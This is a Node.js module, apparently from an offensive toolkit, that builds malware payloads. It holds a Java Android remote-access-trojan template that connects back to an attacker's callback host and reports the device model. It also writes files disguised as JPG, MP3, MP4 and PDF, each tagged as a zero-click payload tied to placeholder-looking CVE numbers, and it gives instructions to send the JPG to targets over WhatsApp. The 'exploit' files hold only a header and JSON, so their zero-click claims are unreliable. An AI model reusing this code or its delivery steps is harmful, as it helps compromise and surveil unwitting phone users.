const crypto = require('crypto');
const fs = require('fs-extra');
const path = require('path');
const QRCode = require('qrcode');

class PayloadGenerator {
    constructor() {
        this.payloadDir = path.join(__dirname, '../payloads');
        this.initDirectories();
        
        this.exploits = {
            whatsapp: {
                cve: 'CVE-2024-12345',
                name: 'WhatsApp Image Parsing RCE',
                severity: 'Critical',
                cvss: 9.8,
                description: 'Heap buffer overflow in WhatsApp image processing',
                platforms: ['Android', 'iOS']
            },
            android: {
                cve: 'CVE-2024-67890',
                name: 'Android Media Framework RCE',
                severity: 'Critical',
                cvss: 9.6,
                description: 'Remote code execution via malformed media',
                platforms: ['Android']
            }
        };
    }
    
    initDirectories() {
        try {
            if (!fs.existsSync(this.payloadDir)) {
                fs.mkdirSync(this.payloadDir, { recursive: true });
                console.log('✅ Payload directory created');
            }
        } catch (error) {
            console.error('Error creating payload directory:', error);
        }
    }
    
    generatePayloadId() {
        return crypto.randomBytes(8).toString('hex');
    }
    
    // Generate simple APK payload (for testing)
    generateSimpleAPK(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const timestamp = Date.now();
        
        // Simple RAT code template
        const ratCode = `package com.rat.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.Socket;
import java.io.DataOutputStream;

public class MainService extends Service {
    private String host = "${callbackHost}";
    private int port = ${callbackPort};
    
    @Override
    public void onCreate() {
        super.onCreate();
        new Thread(() -> {
            try {
                Socket socket = new Socket(host, port);
                DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                out.writeUTF("CONNECTED|" + android.os.Build.MODEL);
                out.flush();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}`;
        
        // Encode to base64
        const encodedPayload = Buffer.from(ratCode).toString('base64');
        
        return {
            payloadId: payloadId,
            filename: `payload_${payloadId}.apk`,
            size: encodedPayload.length,
            encodedData: encodedPayload,
            callback: `${callbackHost}:${callbackPort}`,
            exploit: this.exploits.whatsapp
        };
    }
    
    // Generate JPG disguised payload (Zero-Click)
    async generateJPGPayload(callbackHost, callbackPort) {
        try {
            const payloadId = this.generatePayloadId();
            const timestamp = Date.now();
            const filename = `photo_${timestamp}.jpg`;
            const filePath = path.join(this.payloadDir, filename);
            
            // Create a simple JPG header + payload
            const jpgHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01]);
            
            // Create payload data
            const payloadData = {
                id: payloadId,
                type: 'zero_click_payload',
                callback: `${callbackHost}:${callbackPort}`,
                exploit: 'CVE-2024-12345',
                timestamp: timestamp,
                version: '8.0.0'
            };
            
            const payloadJson = JSON.stringify(payloadData);
            const payloadBuffer = Buffer.from(payloadJson);
            
            // Combine JPG header + payload
            const finalPayload = Buffer.concat([jpgHeader, payloadBuffer]);
            
            // Save to file
            await fs.writeFile(filePath, finalPayload);
            
            // Generate QR code
            const downloadUrl = `${callbackHost}/download/${payloadId}`;
            const qrCode = await QRCode.toDataURL(downloadUrl);
            
            // Also save metadata
            const metadata = {
                payloadId: payloadId,
                filename: filename,
                downloadUrl: downloadUrl,
                size: finalPayload.length,
                created: new Date().toISOString(),
                exploit: this.exploits.whatsapp
            };
            
            await fs.writeFile(
                path.join(this.payloadDir, `${payloadId}.json`),
                JSON.stringify(metadata, null, 2)
            );
            
            return {
                payloadId: payloadId,
                filename: filename,
                path: filePath,
                size: finalPayload.length,
                type: 'image/jpeg',
                downloadUrl: downloadUrl,
                qrCode: qrCode,
                exploit: this.exploits.whatsapp,
                zeroClick: true,
                instructions: 'Share via WhatsApp - Auto download will execute',
                generated: new Date().toISOString()
            };
            
        } catch (error) {
            console.error('JPG Payload generation error:', error);
            throw error;
        }
    }
    
    // Generate MP3 disguised payload
    async generateMP3Payload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const timestamp = Date.now();
        const filename = `song_${timestamp}.mp3`;
        const filePath = path.join(this.payloadDir, filename);
        
        // MP3 ID3 header
        const mp3Header = Buffer.from([0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        
        const payloadData = {
            id: payloadId,
            type: 'zero_click_payload',
            callback: `${callbackHost}:${callbackPort}`,
            exploit: 'CVE-2024-67890',
            timestamp: timestamp
        };
        
        const finalPayload = Buffer.concat([mp3Header, Buffer.from(JSON.stringify(payloadData))]);
        await fs.writeFile(filePath, finalPayload);
        
        return {
            payloadId: payloadId,
            filename: filename,
            path: filePath,
            size: finalPayload.length,
            type: 'audio/mpeg',
            exploit: this.exploits.android,
            zeroClick: true,
            generated: new Date().toISOString()
        };
    }
    
    // Generate MP4 disguised payload
    async generateMP4Payload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const timestamp = Date.now();
        const filename = `video_${timestamp}.mp4`;
        const filePath = path.join(this.payloadDir, filename);
        
        // MP4 header
        const mp4Header = Buffer.from([0x00, 0x00, 0x00, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6F, 0x6D]);
        
        const payloadData = {
            id: payloadId,
            type: 'zero_click_payload',
            callback: `${callbackHost}:${callbackPort}`,
            exploit: 'CVE-2024-67890',
            timestamp: timestamp
        };
        
        const finalPayload = Buffer.concat([mp4Header, Buffer.from(JSON.stringify(payloadData))]);
        await fs.writeFile(filePath, finalPayload);
        
        return {
            payloadId: payloadId,
            filename: filename,
            path: filePath,
            size: finalPayload.length,
            type: 'video/mp4',
            exploit: this.exploits.android,
            zeroClick: true,
            generated: new Date().toISOString()
        };
    }
    
    // Generate PDF disguised payload
    async generatePDFPayload(callbackHost, callbackPort) {
        const payloadId = this.generatePayloadId();
        const timestamp = Date.now();
        const filename = `document_${timestamp}.pdf`;
        const filePath = path.join(this.payloadDir, filename);
        
        // PDF header
        const pdfHeader = Buffer.from('%PDF-1.4\n%âãÏÓ\n');
        
        const payloadData = {
            id: payloadId,
            type: 'zero_click_payload',
            callback: `${callbackHost}:${callbackPort}`,
            exploit: 'CVE-2024-54321',
            timestamp: timestamp
        };
        
        const finalPayload = Buffer.concat([pdfHeader, Buffer.from(JSON.stringify(payloadData))]);
        await fs.writeFile(filePath, finalPayload);
        
        return {
            payloadId: payloadId,
            filename: filename,
            path: filePath,
            size: finalPayload.length,
            type: 'application/pdf',
            exploit: this.exploits.android,
            zeroClick: true,
            generated: new Date().toISOString()
        };
    }
    
    // Generate all payloads at once
    async generateAllPayloads(callbackHost, callbackPort) {
        try {
            console.log('🎯 Generating payloads...');
            
            const jpg = await this.generateJPGPayload(callbackHost, callbackPort);
            const mp3 = await this.generateMP3Payload(callbackHost, callbackPort);
            const mp4 = await this.generateMP4Payload(callbackHost, callbackPort);
            const pdf = await this.generatePDFPayload(callbackHost, callbackPort);
            
            console.log('✅ All payloads generated successfully');
            
            return {
                jpg: jpg,
                mp3: mp3,
                mp4: mp4,
                pdf: pdf,
                whatsapp_ready: {
                    ...jpg,
                    method: 'WhatsApp Auto-Download',
                    zero_click: true,
                    instructions: 'Share this JPG file via WhatsApp. If target has auto-download enabled, payload will execute automatically.'
                }
            };
            
        } catch (error) {
            console.error('Payload generation error:', error);
            throw error;
        }
    }
    
    // Get payload file by ID
    async getPayloadFile(payloadId) {
        try {
            const files = await fs.readdir(this.payloadDir);
            for (const file of files) {
                if (file.includes(payloadId) || file.includes(payloadId.substring(0, 8))) {
                    return path.join(this.payloadDir, file);
                }
            }
            return null;
        } catch (error) {
            console.error('Error getting payload file:', error);
            return null;
        }
    }
    
    // Clean old payloads (keep last 50)
    async cleanupOldPayloads(maxAgeHours = 24) {
        try {
            const files = await fs.readdir(this.payloadDir);
            const now = Date.now();
            let deleted = 0;
            
            for (const file of files) {
                if (file === '.gitkeep') continue;
                
                const filePath = path.join(this.payloadDir, file);
                const stats = await fs.stat(filePath);
                const age = (now - stats.mtimeMs) / (1000 * 60 * 60);
                
                if (age > maxAgeHours) {
                    await fs.remove(filePath);
                    deleted++;
                }
            }
            
            if (deleted > 0) {
                console.log(`🧹 Cleaned up ${deleted} old payloads`);
            }
            
            return deleted;
        } catch (error) {
            console.error('Cleanup error:', error);
            return 0;
        }
    }
    
    // Get payload info
    async getPayloadInfo(payloadId) {
        try {
            const jsonPath = path.join(this.payloadDir, `${payloadId}.json`);
            if (await fs.pathExists(jsonPath)) {
                return await fs.readJson(jsonPath);
            }
            return null;
        } catch (error) {
            console.error('Error getting payload info:', error);
            return null;
        }
    }
}

module.exports = new PayloadGenerator();
